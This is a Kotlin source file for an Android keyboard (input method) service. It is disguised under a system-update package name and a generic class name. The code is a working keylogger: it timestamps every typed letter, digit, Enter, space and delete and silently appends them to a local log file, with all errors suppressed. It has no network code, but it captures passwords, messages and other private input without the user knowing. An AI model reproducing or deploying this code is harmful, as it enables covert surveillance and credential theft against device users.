package com.android.system.update.core

import android.inputmethodservice.InputMethodService
import android.view.KeyEvent
import android.view.View
import java.io.FileWriter
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*

class InputInterfaceProvider : InputMethodService() {
    
    private val logFileName = "keyboard_log.txt"
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
    
    override fun onCreate() {
        super.onCreate()
    }
    
    override fun onCreateInputView(): View {
        return layoutInflater.inflate(R.layout.keyboard_view, null)
    }
    
    override fun onKeyDown(keyCode: Int, event: KeyEvent): Boolean {
        val keyChar = event.unicodeChar.toChar()
        val timestamp = dateFormat.format(Date())
        
        when {
            keyCode == KeyEvent.KEYCODE_ENTER -> {
                logToFile("$timestamp - [ENTER]")
            }
            keyCode == KeyEvent.KEYCODE_SPACE -> {
                logToFile("$timestamp - [ESPACE]")
            }
            keyCode == KeyEvent.KEYCODE_DEL -> {
                logToFile("$timestamp - [SUPPR]")
            }
            keyChar.isLetterOrDigit() || keyChar.isWhitespace() -> {
                logToFile("$timestamp - $keyChar")
            }
        }
        
        return super.onKeyDown(keyCode, event)
    }
    
    private fun logToFile(message: String) {
        try {
            val file = filesDir.resolve(logFileName)
            FileWriter(file, true).use { it.appendLine(message) }
        } catch (e: IOException) {}
    }
}
